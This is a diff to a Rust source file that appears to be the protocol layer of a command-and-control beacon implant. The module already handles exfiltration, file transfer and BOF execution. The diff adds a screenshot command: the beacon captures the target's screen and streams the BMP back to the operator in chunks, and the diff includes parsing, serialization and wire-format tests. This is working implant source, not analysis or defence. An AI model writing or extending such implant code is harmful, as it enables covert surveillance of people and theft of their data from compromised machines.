@@ -142,6 +142,15 @@ pub const JOB_STATE_KILLED: u8 = 0x3;
 pub const COMMAND_DOWNLOAD: u32 = 32;
 pub const COMMAND_UPLOAD: u32 = 33;
 pub const COMMAND_EXFIL: u32 = 35;
+/// Screenshot capture (free id in the native numbering — the 41-47
+/// neighborhood is ps/jobs). The beacon captures the screen into a heap
+/// buffer at task time, then streams the BMP across cycles exactly like a
+/// download (the POST body frame is 0x12000, a full-screen BMP is ~7 MiB).
+pub const COMMAND_SCREENSHOT: u32 = 44;
+/// Screenshot stream states (COMMAND_SCREENSHOT result byte).
+pub const SCREENSHOT_START: u8 = 1;
+pub const SCREENSHOT_CONTINUE: u8 = 2;
+pub const SCREENSHOT_FINISH: u8 = 3;
 /// Server-side memory chunking of upload payloads (docs/WIRE.md).
 pub const COMMAND_SAVEMEMORY: u32 = 0x2321;
 /// BOF execution (native beacon_agent `execute bof`, pl_utils.go).
@@ -246,6 +255,8 @@ pub enum Task {
     },
     /// `COMMAND_EXFIL` with the state and the download id.
     Exfil { action: u8, file_id: u32 },
+    /// `COMMAND_SCREENSHOT`: capture the screen (no arguments).
+    Screenshot,
 }
 
 impl Task {
@@ -411,6 +422,7 @@ pub fn parse_task(r: &mut Reader) -> Option<(Task, u32)> {
             let job_id = r.u32_le()?;
             Task::JobsKill { job_id }
         }
+        COMMAND_SCREENSHOT => Task::Screenshot,
         _ => return None,
     };
     let id = r.u32_le()?;
@@ -569,6 +581,23 @@ pub fn push_download_continue(w: &mut Writer, task_id: u32, file_id: u32, chunk:
 
 pub fn push_download_finish(w: &mut Writer, task_id: u32, file_id: u32) -> bool {
     push_result_header(w, task_id, COMMAND_DOWNLOAD) && w.u32(file_id) && w.u8(DOWNLOAD_FINISH)
+}
+
+/// SCREENSHOT stream records (the capture lives in a beacon heap buffer,
+/// streamed one chunk per cycle like a download; the server reassembles by
+/// task id and hands the full BMP to `TsScreenshotAdd`).
+pub fn push_screenshot_start(w: &mut Writer, task_id: u32, size: u64) -> bool {
+    push_result_header(w, task_id, COMMAND_SCREENSHOT) && w.u8(SCREENSHOT_START) && w.u64(size)
+}
+
+pub fn push_screenshot_continue(w: &mut Writer, task_id: u32, chunk: &[u8]) -> bool {
+    push_result_header(w, task_id, COMMAND_SCREENSHOT)
+        && w.u8(SCREENSHOT_CONTINUE)
+        && w.array(chunk)
+}
+
+pub fn push_screenshot_finish(w: &mut Writer, task_id: u32) -> bool {
+    push_result_header(w, task_id, COMMAND_SCREENSHOT) && w.u8(SCREENSHOT_FINISH)
 }
 
 /// EXFIL control ack: `int fileId || byte state` — the server renders
@@ -1187,6 +1216,42 @@ mod tests {
         let bytes = [99u8, 0, 0, 0, 1, 0, 0, 0];
         let mut r = Reader::new(&bytes);
         assert!(parse_task(&mut r).is_none());
+    }
+
+    #[test]
+    fn parse_task_screenshot() {
+        // "screenshot" (44) has no arguments: u32 LE 44 || u32 LE taskId.
+        let bytes = [44u8, 0, 0, 0, 0x21, 0x43, 0, 0];
+        let mut r = Reader::new(&bytes);
+        assert_eq!(parse_task(&mut r), Some((Task::Screenshot, 0x4321)));
+        assert_eq!(r.remaining(), 0);
+    }
+
+    /// Screenshot stream records, byte-pinned: START carries the total BMP
+    /// size (u64 BE), CONTINUE an array chunk, FINISH nothing — the server
+    /// reassembles by task id and closes on FINISH.
+    #[test]
+    fn screenshot_records_pin_the_wire() {
+        let mut buf = [0u8; 64];
+        let mut w = Writer::new(&mut buf);
+        assert!(push_screenshot_start(
+            &mut w,
+            0x1122_3344,
+            0x0102_0304_0506_0708
+        ));
+        assert!(push_screenshot_continue(&mut w, 0x1122_3344, b"BM\x36"));
+        assert!(push_screenshot_finish(&mut w, 0x1122_3344));
+        let expected = hex(concat!(
+            "11223344",           // taskId BE
+            "0000002c",           // COMMAND_SCREENSHOT (44) BE
+            "01",                 // SCREENSHOT_START
+            "0102030405060708",   // total BMP size BE
+            "112233440000002c02", // taskId BE || 44 BE || SCREENSHOT_CONTINUE
+            "00000003",           // array len BE
+            "424d36",             // chunk bytes
+            "112233440000002c03", // taskId BE || 44 BE || SCREENSHOT_FINISH
+        ));
+        assert_eq!(w.written_bytes(), &expected[..]);
     }
 
     /// Results body, byte-pinned against the Go generator: the framed pack
